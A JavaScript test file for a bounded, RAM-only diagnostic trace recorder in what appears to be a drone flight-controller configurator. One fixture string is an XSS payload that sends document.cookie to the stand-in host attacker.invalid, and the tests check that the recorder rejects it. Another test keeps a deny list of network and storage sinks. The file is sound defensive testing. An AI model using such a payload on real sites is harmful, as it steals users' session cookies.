import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import {
  DIAGNOSTIC_TRACE_CAPACITY,
  DiagnosticTraceRecorder,
  formatSafeDiagnosticTrace,
} from "../src/diagnostics/readonly-trace.mjs";

const safeChunk = (byteCount) => ({
  layer: "SERIAL",
  phase: "SERIAL_READ",
  event: "RX_CHUNK",
  stage: "API_VERSION",
  command: "MSP_API_VERSION",
  byteCount,
  direction: "REPLY",
});

test("the RAM-only ring buffer has a deterministic 200-event bound", () => {
  const trace = new DiagnosticTraceRecorder();
  for (let index = 0; index < DIAGNOSTIC_TRACE_CAPACITY + 5; index += 1) {
    trace.record(safeChunk(index));
  }

  const snapshot = trace.snapshot();
  assert.equal(snapshot.length, 200);
  assert.equal(snapshot[0].sequence, 6);
  assert.equal(snapshot.at(-1).sequence, 205);
  assert.equal(snapshot.at(-1).byteCount, 204);
  assert.ok(Object.isFrozen(snapshot));
  assert.ok(Object.isFrozen(snapshot[0]));

  trace.beginAttempt();
  assert.deepEqual(trace.snapshot(), []);
  assert.equal(trace.record(safeChunk(1)).sequence, 1);
});

test("the recorder rejects raw, arbitrary, and structurally unbounded fields", () => {
  const trace = new DiagnosticTraceRecorder();
  const attack = '<script>fetch("https://attacker.invalid/" + document.cookie)</script>';

  assert.throws(() => trace.record({ ...safeChunk(1), raw: [36, 77, 62] }));
  assert.throws(() => trace.record({ ...safeChunk(1), payload: attack }));
  assert.throws(() => trace.record({ ...safeChunk(1), error: new Error(attack) }));
  assert.throws(() => trace.record({ ...safeChunk(1), port: { usbVendorId: 1234 } }));
  assert.throws(() => trace.record({ ...safeChunk(1), origin: attack }));
  assert.throws(() => trace.record({ ...safeChunk(1), command: attack }));
  assert.throws(() => trace.record({ ...safeChunk(1), byteCount: 65_536 }));
  assert.throws(() =>
    trace.record({
      layer: "HOST",
      phase: "FINAL_RESULT",
      event: "FINAL_FAILED",
      failureClass: "Unknown",
    }),
  );
  assert.deepEqual(trace.snapshot(), []);
});

test("copy text contains only fixed tokens and bounded numeric metadata", () => {
  const trace = new DiagnosticTraceRecorder();
  trace.record({
    layer: "RUST",
    phase: "API_VERSION",
    event: "DIRECTIVE",
    stage: "API_VERSION",
    command: "MSP_API_VERSION",
    byteCount: 6,
    direction: "REQUEST",
  });
  trace.record({
    layer: "MSP",
    phase: "MSP_FRAME",
    event: "FRAME_REJECTED",
    stage: "API_VERSION",
    command: "MSP_API_VERSION",
    direction: "ERROR",
    failureClass: "MalformedResponse",
    origin: "MSP_FRAME",
  });

  assert.equal(
    formatSafeDiagnosticTrace([...trace.snapshot()]),
    [
      "FPV_ARBCON_READONLY_DIAGNOSTIC_TRACE_V1",
      "sequence=1 layer=RUST phase=API_VERSION event=DIRECTIVE stage=API_VERSION command=MSP_API_VERSION byteCount=6 direction=REQUEST",
      "sequence=2 layer=MSP phase=MSP_FRAME event=FRAME_REJECTED stage=API_VERSION command=MSP_API_VERSION direction=ERROR failureClass=MalformedResponse origin=MSP_FRAME",
      "",
    ].join("\n"),
  );
});

test("the trace implementation has no logging, persistence, or network sink", async () => {
  const source = await readFile(
    new URL("../src/diagnostics/readonly-trace.mjs", import.meta.url),
    "utf8",
  );
  for (const forbidden of [
    "console.",
    "localStorage",
    "sessionStorage",
    "indexedDB",
    "fetch(",
    "XMLHttpRequest",
    "WebSocket",
    "sendBeacon",
  ]) {
    assert.equal(source.includes(forbidden), false, forbidden);
  }
});
